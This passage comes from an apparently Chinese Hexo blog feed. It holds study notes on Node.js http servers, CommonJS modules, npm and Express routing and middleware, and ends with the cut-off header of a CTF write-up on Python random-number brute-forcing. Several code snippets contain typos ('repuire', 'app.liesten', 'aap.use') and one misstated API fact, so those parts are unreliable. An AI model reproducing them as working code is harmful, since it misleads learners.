class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server.on(&#x27;request&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    //res是响应对象，它包含了与服务器相关的数据和属性，例如</span><br><span class="line">    //要发送到客户端的字符串</span><br><span class="line">    const str = `Your request url is $&#123;req.url&#125;,and request method is $&#123;req.method&#125;`</span><br><span class="line">    //res.end()方法的作用：</span><br><span class="line">    //向客户端发送指定的内容，并结束此次请求的处理过程</span><br><span class="line">    res.end(str)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>解决中文乱码问题：当调用res.end()方法时，向客户端发送中文内容的时候，会出现乱码问题，此时，需要手动设置内容的编码格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//直接在res.end()之前加一个：</span><br><span class="line">res.setHeader(&#x27;Content-Type&#x27;,&#x27;text/html;charset=utf-8&#x27;)</span><br></pre></td></tr></table></figure><h6 id="根据不同url响应不同的html内容"><a href="#根据不同url响应不同的html内容" class="headerlink" title="根据不同url响应不同的html内容"></a>根据不同url响应不同的html内容</h6><ul><li>获取请求的url地址</li><li>设置默认的相应内容为404 Not found</li><li>判断用户请求的是否为 &#x2F; 或者 &#x2F;index.html首页</li><li>判断用户请求的是否为 &#x2F;about.html页面</li><li>设置content-type响应头，防止中文乱码</li><li>使用res.end()把内容响应给客户端</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server.on(&#x27;request&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    const url = req.url                         //1.获取请求的url地址</span><br><span class="line">     let content = &#x27;&lt;h1&gt;404 Not Found&lt;/h1&gt;&#x27;      //2.设置默认的相应内容为404 Not found</span><br><span class="line">     if(url ==&#x27;/&#x27;url == &#x27;/index.html&#x27;)         //3.判断用户请求的是否为 / 或者 /index.html首页</span><br><span class="line">     &#123;</span><br><span class="line">     content = &#x27;&lt;h1&gt;首页&lt;/h1&gt;&#x27;</span><br><span class="line">     &#125;</span><br><span class="line">    else if(url == &#x27;/about.html&#x27;)&#123;               //4.判断用户请求的是否为 /about.html页面</span><br><span class="line">      content = &#x27;&lt;h1&gt;关于&lt;/h1&gt;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    res.setHeader(&#x27;Content-Type&#x27;,&#x27;text/html;charset=utf-8&#x27;)  //5.设置content-type响应头，防止中文乱码</span><br><span class="line">    res.end(content)                              //6.使用res.end()把内容响应给客户端</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="综合实战1"><a href="#综合实战1" class="headerlink" title="综合实战1"></a>综合实战1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&#x27;http&#x27;)</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line"></span><br><span class="line">const server = http.createServer()</span><br><span class="line">server.on(&#x27;request&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    const url = req.url</span><br><span class="line">    //const fpath = path.join(__dirname,url)</span><br><span class="line">    let fpath = &#x27;&#x27;</span><br><span class="line">    if(url ===&#x27;/&#x27;)&#123;</span><br><span class="line">        fpath = path.join(__dirname,&#x27;./clock/index.html&#x27;)</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        fpath = path.join(__dirname,&#x27;./clock/&#x27;,url)</span><br><span class="line">    &#125;</span><br><span class="line">    res.setHeader(&#x27;Content-Type&#x27;,&#x27;text/html;charset=utf-8&#x27;)</span><br><span class="line">    fs.readFile(fpath,&#x27;utf8&#x27;,(err,dataStr)=&gt;&#123;</span><br><span class="line">        if(err)&#123;</span><br><span class="line">            return res.end(&#x27;404 Not Found&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">        res.end(dataStr)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">server.listen(80,()=&gt;&#123;</span><br><span class="line">        console.log(&#x27;server running on http://127.0.0.1:80&#x27;)      </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h5><h6 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h6><p>模块化是指解决一个复杂问题时，自顶向下逐层把系统划分成若干个模块的过程。对于整个系统来说，模块是可组成、分解、和更换的单元。</p><p>在编程领域中，模块化就是遵守固定的规则，把一个大文件拆成独立并且互相依赖的多个小模块(文件)。</p><ul><li>提高代码复用性</li><li>提高代码可维护性</li><li>可以实现按需加载</li></ul><h6 id="模块分类"><a href="#模块分类" class="headerlink" title="模块分类"></a>模块分类</h6><p>Node.js中根据模块来源的不同，将模块分为了三大类，分别是：</p><ul><li>内置模块(内置模块是有Node.js官方提供的，例如fs、path、http等)</li><li>自定义模块(用户创建的每个.js文件，都是自定义模块)</li><li>第三方模块(由第三方开发出来的模块，并非官方提供的内置模块，也不是用户创建的自定义模块，需要提前下载)</li></ul><h6 id="加载模块"><a href="#加载模块" class="headerlink" title="加载模块"></a>加载模块</h6><p>使用require()方法加载模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//1.加载内置的fs模块</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">//2.加载用户自定义的模块</span><br><span class="line">const custom = require(&#x27;./custom.js&#x27;)     //在加载自定义文件时，可以不用加后缀名，require会自动补全js后缀名</span><br><span class="line">//3.加载第三方模块(还需要下载)</span><br><span class="line">const moment = require(&#x27;moment&#x27;)</span><br></pre></td></tr></table></figure><p>当使用require这个方法去加载其他模块的时候，会执行模块里的代码</p><h6 id="模块作用域"><a href="#模块作用域" class="headerlink" title="模块作用域"></a>模块作用域</h6><p>和函数作用域类似，在自定义模块中定义的变量、方法等成员，只能在当前模块中被访问，这种模块级别的访问限制，叫做模块作用域。</p><p>好处是：避免了<strong>全局变量污染</strong>问题</p><p>向外共享模块作用域中的成员？ -&gt; module对象</p><h6 id="module-exports"><a href="#module-exports" class="headerlink" title="module.exports"></a>module.exports</h6><p>在每一个.js自定义模块中都有一个module对象，它里面存储了和当前模块有关的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//直接打印出来看看</span><br><span class="line">//console.log(module)</span><br><span class="line">Module &#123;</span><br><span class="line">  id: &#x27;.&#x27;,</span><br><span class="line">  path: &#x27;D:\\code\\jscode&#x27;,</span><br><span class="line">  exports: &#123;&#125;,                      </span><br><span class="line">  filename: &#x27;D:\\code\\jscode\\7.js&#x27;,</span><br><span class="line">  loaded: false,</span><br><span class="line">  children: [],</span><br><span class="line">  paths: [</span><br><span class="line">    &#x27;D:\\code\\jscode\\node_modules&#x27;,</span><br><span class="line">    &#x27;D:\\code\\node_modules&#x27;,</span><br><span class="line">    &#x27;D:\\node_modules&#x27;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>module.exports对象：在自定义模块中，可以使用module.exports对象，将模块内的成员共享出去，供外界使用。</p><p>外界使用require()方法导入自定义模块的时候，得到的就是module.exports所指向的对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//1.js</span><br><span class="line">//在一个自定义模块中，默认情况下，module.exports= &#123;&#125;</span><br><span class="line">//向module.exports对象上挂载username属性</span><br><span class="line">module.exports.username=&#x27;zs&#x27;</span><br><span class="line">//向module.exports对象上挂载sayHello方法</span><br><span class="line">module.exports.sayHello = function()&#123;</span><br><span class="line">    console.log(&#x27;Hello!&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//2.js</span><br><span class="line">const m = require(&#x27;./1.js&#x27;)</span><br><span class="line">console.log(m)   </span><br><span class="line">///&#123;username:&#x27;zs&#x27;,sayHello:[Function]&#125;</span><br></pre></td></tr></table></figure><h6 id="exports对象"><a href="#exports对象" class="headerlink" title="exports对象"></a>exports对象</h6><p>由于module.exports单词写起来比较复杂，为了简化向外共享成员的代码，Node提供了exports对象。默认情况下，exports和module.exports指向同一个对象。最终共享的结果，还是以module.exports指向的对象为准</p><h6 id="模块化规范"><a href="#模块化规范" class="headerlink" title="模块化规范"></a>模块化规范</h6><p>Node.js遵循了CommonJS模块化规范，CommenJS规定了模块的特性和各模块之间如何相互依赖</p><p>CommenJS规定：</p><ul><li>每个模块内部，module变量代表当前模块</li><li>module变量是一个对象，它的exports属性（modle.exports）是对外的接口</li><li>加载某个模块，其实就是加载改模块的module.exports属性。require()方法用于加载模块。</li></ul><h6 id="npm与包"><a href="#npm与包" class="headerlink" title="npm与包"></a>npm与包</h6><p>包就可以理解为第三方模块了。</p><p>安装命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install 包的完整名称[@版本号]</span><br><span class="line">npm i 包的完整名称[@版本号]</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const moment = require(&#x27;moment&#x27;)</span><br><span class="line">const dt = moment().format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;)</span><br><span class="line">console.log(dt)</span><br></pre></td></tr></table></figure><p>文件结构</p><p>初次装包完成之后，在项目文件夹下面会多一个叫做node_modules的文件夹和package-lock.json的配置文件</p><ul><li>node_modules文件夹用来存放所有已经安装到项目中的包。require()导入第三方包的时候，就是从这个目录中查找并加载包</li><li>package-lock.json配置文件用来记录node_modules目录下的每一个包的下载信息，例如包的名字、版本号、下载地址等</li></ul><p>注意：不要手动修改这两个文件的内容，npm包会自动维护。</p><h6 id="模块的加载机制"><a href="#模块的加载机制" class="headerlink" title="模块的加载机制"></a>模块的加载机制</h6><ul><li>优先从缓存中加载[所有模块]</li></ul><p>模块在第一册加载后会被缓存。这也意味着多次调用require()不会导致模块的代码被执行多次。</p><ul><li>内置模块的加载优先级最高</li></ul><p>若存在第三方模块或者自定义模块和内置模块重名了，调用时默认加载内置模块，因为它的优先级最高</p><ul><li>自定义模块加载的时候，必须是指明路径，否则不会被当做自定义模块加载。无后缀的情况下，npm会默认以先后顺序尝试加上后缀： .js .json .node</li></ul><h5 id="Express"><a href="#Express" class="headerlink" title="Express"></a>Express</h5><h6 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h6><p>Express是基于Node.js平台，快速、开放、极简的Web开发框架。通俗的理解：Express的作用和Node.js内置的http模块类似，是专门用来创建web服务器的。Express的本质：就是一个npm上的第三方包，提供了快速创建Web服务器的便捷方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install express --save</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 1.导入express</span><br><span class="line">const express = repuire(&#x27;express&#x27;)</span><br><span class="line">// 2.创建web服务器</span><br><span class="line">const app = express()</span><br><span class="line">// 3.调用app.listen(端口号，启动成功后的回调函数)，启动服务器</span><br><span class="line">app.listen(80,() =&gt;&#123;</span><br><span class="line">    console.log(&#x27;express server rnning at http://127.0.0.1:80&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="监听GET请求"><a href="#监听GET请求" class="headerlink" title="监听GET请求"></a>监听GET请求</h6><p>通过app.get()方法，可以监听客户端的GET请求，具体的语法格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//参数1：客户端请求的URL地址</span><br><span class="line">//参数2：请求对应的处理函数</span><br><span class="line">//     req：请求对象(包含了与请求相关的属性与方法)</span><br><span class="line">//     req:响应对象(包含了与响应相关的属性与方法)</span><br><span class="line">app.get(&#x27;请求的url&#x27;,function(req,res)&#123; /*处理函数*/&#125;)</span><br></pre></td></tr></table></figure><h6 id="监听POST请求"><a href="#监听POST请求" class="headerlink" title="监听POST请求"></a>监听POST请求</h6><p>通过app.post方法，可以监听客户端的POST请求，具体的语法格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//参数1：客户端请求的URL地址</span><br><span class="line">//参数2：请求对应的处理函数</span><br><span class="line">//     req：请求对象(包含了与请求相关的属性与方法)</span><br><span class="line">//     req:响应对象(包含了与响应相关的属性与方法)</span><br><span class="line">app.post(&#x27;请求的url&#x27;,function(req,res)&#123; /*处理函数*/&#125;)</span><br></pre></td></tr></table></figure><h6 id="把内容响应给客户端"><a href="#把内容响应给客户端" class="headerlink" title="把内容响应给客户端"></a>把内容响应给客户端</h6><p>通过res.send()方法，把处理好的内容发送给客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#x27;/user&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    res.send(&#123;name:&#x27;zs&#x27;,age:20,gender:&#x27;男&#x27;&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.post(&#x27;/user&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    res.send(&#x27;请求成功！&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 1.导入express</span><br><span class="line">const express = repuire(&#x27;express&#x27;)</span><br><span class="line">// 2.创建web服务器</span><br><span class="line">const app = express()</span><br><span class="line">//4.监听客户端的GET和POST请求，并向客户端响应具体的内容</span><br><span class="line">app.get(&#x27;/user&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    res.send(&#123;name:&#x27;zs&#x27;,age:20,gender:&#x27;男&#x27;&#125;)   //响应一个json数据</span><br><span class="line">&#125;)</span><br><span class="line">app.post(&#x27;/user&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    res.send(&#x27;请求成功！&#x27;)                      // 响应一段字符串</span><br><span class="line">&#125;)</span><br><span class="line">// 3.调用app.listen(端口号，启动成功后的回调函数)，启动服务器</span><br><span class="line">app.listen(80,() =&gt;&#123;</span><br><span class="line">    console.log(&#x27;express server rnning at http://127.0.0.1:80&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="获取URL中携带的查询参数"><a href="#获取URL中携带的查询参数" class="headerlink" title="获取URL中携带的查询参数"></a>获取URL中携带的查询参数</h6><p>通过req.params对象，可以访问到客户端通过查询字符串的形式，发送到服务器的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//URL地址中，可以通过：参数名的形式，匹配动态参数值</span><br><span class="line">app.get(&#x27;&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    //req.query   默认是一个空对象</span><br><span class="line">    //客户端使用127.0.0.1/?age=20&amp;name=psych，这种查询字符串形式，发送到服务器的参数</span><br><span class="line">    //可以通过req.query对象访问到，例如：</span><br><span class="line">    //req.query.name  req.query.age</span><br><span class="line">    res.send(req.query)     //访问127.0.0.1/?age=20&amp;name=psych，就会返回&#123;age:20,name:&#x27;psych&#x27;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="获取URL中的动态参数"><a href="#获取URL中的动态参数" class="headerlink" title="获取URL中的动态参数"></a>获取URL中的动态参数</h6><p>通过req.params对象，可以访问到URL中，通过：匹配到的动态参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//URL地址中，可以通过：参数名 的形式，匹配到动态参数值</span><br><span class="line">app.get(&#x27;/user/:ids&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    //req.params  默认是一个空对象</span><br><span class="line">    //  里面存放着通过：动态匹配到的参数值</span><br><span class="line">    console.log(req.params)         //访问/user/1    匹配到的就是  &#123;&#x27;ids&#x27;:1&#125;</span><br><span class="line">    res.send(req.params)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="托管静态资源"><a href="#托管静态资源" class="headerlink" title="托管静态资源"></a>托管静态资源</h6><p>express提供了一个非常好用的函数，express.static(),通过它，我们可以非常方便地创建一个静态资源服务器，例如，通过如下代码就可以将public目录下的图片，CSS文件，JavaScript文件对外开放了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;)</span><br><span class="line">const app =express()</span><br><span class="line"></span><br><span class="line">app.uer(express.static(&#x27;./public&#x27;))      //可以多次调用，以添加多个目录</span><br><span class="line"></span><br><span class="line">app.liesten(80,()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;express server running at http:127.0.0.1:80&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>现在，就可以访问public目录中的所有文件了.</p><p>注意：Express在制定的静态目录中查找文件，并对外提供资源的访问路径。因此，存放静态文件的目录名不会出现在URL中。如果希望它出现在路径中，可以这样修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(&#x27;/public&#x27;,express.static(&#x27;public&#x27;))</span><br></pre></td></tr></table></figure><h5 id="Express路由"><a href="#Express路由" class="headerlink" title="Express路由"></a>Express路由</h5><p>Express中，路由指的是客户端的请求与服务器处理函数之间的映射关系</p><p>Express中的路由有三部分组成，分别是请求的类型，请求的URL地址，处理函数，格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.METHOD(PATH,HANDLER)</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//匹配GET请求，且请求URL为 /</span><br><span class="line">app.get(&#x27;/&#x27;,function(req,res)&#123;</span><br><span class="line">    res.send(&#x27;Hello World&#x27;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">//匹配POST请求 ，且请求URL为 /</span><br><span class="line">app.post(&#x27;/&#x27;,function(req,res)&#123;</span><br><span class="line">    res.send(&#x27;Got a post request&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="路由的匹配过程"><a href="#路由的匹配过程" class="headerlink" title="路由的匹配过程"></a>路由的匹配过程</h6><p>每当一个请求到达服务器之后，需要先经过路由的匹配，只有匹配成功之后，才会调用对应的处理函数。在匹配时，会按照路由的顺序进行匹配，如果请求类型和请求的URL同时匹配成功，则Express会将这次请求，转交给对应的function进行处理。</p><h6 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;)</span><br><span class="line">const app = express()</span><br><span class="line">app.get(&#x27;/&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    res.send(&#x27;Hello World&#x27;)</span><br><span class="line">&#125;)</span><br><span class="line">app.post(&#x27;/&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    res.send(&#x27;Post Request&#x27;)</span><br><span class="line">&#125;)</span><br><span class="line">app.listen(80,()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;Express server running at http:127.0.0.1:80&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="Express中间件"><a href="#Express中间件" class="headerlink" title="Express中间件"></a>Express中间件</h6><p>Express的中间件，本质上就是一个function处理函数，Express中间件格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;,function(req,res,next)&#123;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line">app.listen(3000);</span><br><span class="line">注意：中间件函数形参列表中，必须包含next参数，而路由处理函数中只有req和res。</span><br></pre></td></tr></table></figure><p>next函数是实现多个中间件连续调用的关键，它表示把流转关系交给下一个中间件或路由</p><h6 id="定义中间件函数"><a href="#定义中间件函数" class="headerlink" title="定义中间件函数"></a>定义中间件函数</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;)</span><br><span class="line">const app = express()</span><br><span class="line"></span><br><span class="line">const mw = function(req,res,next)&#123;</span><br><span class="line">    console.log(&#x27;这是最简单的中间件函数&#x27;)</span><br><span class="line">    next()</span><br><span class="line">&#125;</span><br><span class="line">app.listen(80)</span><br></pre></td></tr></table></figure><p>全局生效的中间件：只需要加一行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aap.use(mw)</span><br></pre></td></tr></table></figure><p>简化格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.use((req,res,next)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;这是最简单的中间件函数&#x27;)</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>注意事项：</p><ul><li>一定要在路由之前注册中间件</li><li>客户端发送过来的请求，可以连续调用多个中间件处理</li><li>执行完中间件爱你的业务代码之后，不要忘记调用next()函数</li><li>为了防止代码逻辑混乱，调用next()函数之后不要再写额外的代码</li><li>连续调用多个中间件时，多个中间件之间，共享req和res对象</li></ul><h5 id="Express写接口"><a href="#Express写接口" class="headerlink" title="Express写接口"></a>Express写接口</h5><h6 id="创建基本的服务器"><a href="#创建基本的服务器" class="headerlink" title="创建基本的服务器"></a>创建基本的服务器</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;)</span><br><span class="line">const app = express()</span><br><span class="line">//write your code here</span><br><span class="line">app.listen(80)</span><br></pre></td></tr></table></figure><h6 id="创建API路由模块"><a href="#创建API路由模块" class="headerlink" title="创建API路由模块"></a>创建API路由模块</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;)</span><br><span class="line">const app = express()</span><br><span class="line">const router = express.Router()</span><br><span class="line"></span><br><span class="line">//在这里挂载对应的路由</span><br><span class="line"></span><br><span class="line">module.exports = router</span><br><span class="line"></span><br><span class="line">// ====================================</span><br><span class="line"></span><br><span class="line">//app.js  【导入并注册路由模块】</span><br><span class="line">const apiRouter = require(&#x27;./apiRouter.js&#x27;)</span><br><span class="line">app.use(&#x27;/api&#x27;.apiRouter)</span><br></pre></td></tr></table></figure><h6 id="编写GET接口"><a href="#编写GET接口" class="headerlink" title="编写GET接口"></a>编写GET接口</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apiRouter.get(&#x27;/get&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    const query = req.query</span><br><span class="line">    res.send(&#123;</span><br><span class="line">        status:0,             //status,0表示成功，1表示失败</span><br><span class="line">        msg:&#x27;GET请求成功&#x27;     //状态描述</span><br><span class="line">        data:query           //需要响应给客户端的具体数据</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>post同理，但是如果要获取URL-encoded格式的请求体数据，必须配置中间件<code>app.use(express.urlencoded(&#123;entended:false&#125;))</code></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-2023-gift_in_qrcode(revenge)</title>
      <link href="/2023/08/29/nssctf-2023-%E9%83%A8%E5%88%86writeup/"/>
      <url>/2023/08/29/nssctf-2023-%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h2><p>NSSCTF-2023-misc-gift_in_qrcode(revenge)</p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>getrandbits(8) python伪随机数 爆破脚本的编写</p><h2 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h2><p>main.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 